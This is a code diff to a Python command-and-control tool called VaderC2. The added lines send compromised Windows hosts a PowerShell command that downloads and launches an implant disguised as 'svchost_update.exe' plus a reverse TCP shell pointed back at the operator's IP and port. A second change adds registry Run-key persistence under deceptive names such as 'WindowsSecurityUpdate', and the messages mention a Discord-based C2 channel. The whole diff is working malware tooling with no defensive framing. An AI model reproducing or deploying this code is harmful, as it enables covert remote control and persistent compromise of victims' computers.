@@ -680,14 +680,19 @@ class VaderC2:
                             my_ip = "192.168.1.92"
                         deploy_cmd = (
                             f'taskkill /F /IM svchost_update.exe 2>nul & '
-                            f'powershell -c "Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
+                            f'taskkill /F /IM vader_shell.exe 2>nul & '
+                            f'powershell -c "'
+                            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
                             f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
-                            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'"'
+                            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/vader_shell.exe\' '
+                            f'-OutFile \'C:\\Users\\Public\\vader_shell.exe\'; '
+                            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'; '
+                            f'Start-Process \'C:\\Users\\Public\\vader_shell.exe\' -ArgumentList \'{my_ip}\',\'{self.port}\'"'
                         )
-                        print(f"  {AMBER}[*] Deploying implant via {matches[0][:8]}...{RST}")
+                        print(f"  {AMBER}[*] Deploying implant + shell via {matches[0][:8]}...{RST}")
                         try:
                             s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
-                            print(f"  {GREEN}[+] Deploy command sent. Watch Discord #c2 for new session.{RST}")
+                            print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell → {my_ip}:{self.port}{RST}")
                         except Exception as e:
                             print(f"  {RED}[!] Send failed: {e}{RST}")
 
@@ -947,14 +952,26 @@ setInterval(grab,{interval*1000});
                         print(f"  {RED}[!] No TCP session.{RST}")
                     else:
                         s = self.sessions[matches[0]]
+                        try:
+                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            _s.connect(("8.8.8.8", 80))
+                            my_ip = _s.getsockname()[0]
+                            _s.close()
+                        except Exception:
+                            my_ip = "192.168.1.92"
                         persist_cmd = (
                             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                             '/v WindowsSecurityHealth /t REG_SZ '
-                            '/d "C:\\Users\\Public\\svchost_update.exe" /f'
+                            '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
+                            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
+                            f'/v WindowsSecurityUpdate /t REG_SZ '
+                            f'/d "C:\\Users\\Public\\vader_shell.exe {my_ip} {self.port}" /f'
                         )
                         try:
                             s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
-                            print(f"  {GREEN}[+] Persistence set: HKCU\\Run\\WindowsSecurityHealth{RST}")
+                            print(f"  {GREEN}[+] Persistence set:{RST}")
+                            print(f"  {GREEN}    WindowsSecurityHealth  → Discord implant{RST}")
+                            print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell → {my_ip}:{self.port}{RST}")
                         except Exception as e:
                             print(f"  {RED}[!] {e}{RST}")
 
